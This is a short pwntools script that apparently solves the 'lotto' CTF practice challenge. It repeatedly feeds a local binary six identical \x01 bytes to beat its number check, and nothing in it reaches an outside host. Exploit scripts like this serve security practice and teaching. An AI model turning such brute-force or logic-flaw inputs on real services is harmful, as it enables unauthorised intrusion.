from pwn import *
p = process('/home/lotto/lotto')

while 1:
  print(p.readuntil(b'Exit'))
  p.sendline(b'1')
  p.sendline(b': ')
  p.sendline(b'\x01\x01\x01\x01\x01\x01')

p.interactive()